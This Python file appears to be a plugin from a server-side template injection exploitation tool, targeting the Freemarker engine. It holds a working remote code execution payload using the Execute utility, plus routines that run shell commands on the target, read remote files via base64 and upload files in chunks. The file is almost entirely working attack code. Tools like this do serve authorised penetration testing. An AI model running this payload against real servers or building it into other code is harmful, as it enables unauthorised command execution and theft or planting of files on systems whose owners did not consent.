from utils.strings import quote, chunkit, base64encode, base64decode, md5
from core.check import Check
from utils.loggers import log
from utils import rand
import re

class Freemarker(Check):

    render_tag = '${%(payload)s}'
    header_tag = '${%(header)s}'
    trailer_tag = '${%(trailer)s}'
    contexts = [
        { 'level': 1, 'prefix': '}', 'suffix' : '${' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.inject(payload):
            self.set('language', 'java')
            self.set('engine', 'freemarker')

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)
            # TODO: manage Window environment
            self.set('os', self.execute("uname"))


    def execute(self, command):

        return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (quote(command)))

    def detect_write(self):
        self.set('write', self.get('exec'))
    
    def write(self, data, remote_path):
        
        # Check existance and overwrite with --force-overwrite
        if self._md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                self.execute("bash -c {echo,-n,}>%s" % (remote_path))
        
        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):
            
            chunk_b64 = base64encode(chunk)
            self.execute("bash -c {base64,--decode}<<<%s>>%s" % (chunk_b64, remote_path))
        
        if not md5(data) == self._md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.warn('File uploaded correctly')

    def _md5(self, remote_path):
        
        md5_result = self.execute("bash -c md5<%s" % (remote_path))
        md5_extracted = re.findall(r"([a-fA-F\d]{32})", md5_result)
        if md5_extracted:
            return md5_extracted[0]
            
    def detect_read(self):
        self.set('read', self.get('exec'))
    
    def read(self, remote_path):
        
        # Get remote file md5
        md5_remote = self._md5(remote_path)
            
        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return
        
        # Using base64 since self.execute() calling self.inject() strips
        # the response, corrupting the data
        data_b64encoded = self.execute('bash -c base64<%s' % remote_path)
        data = base64decode(data_b64encoded)
        
        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')
            
        return data
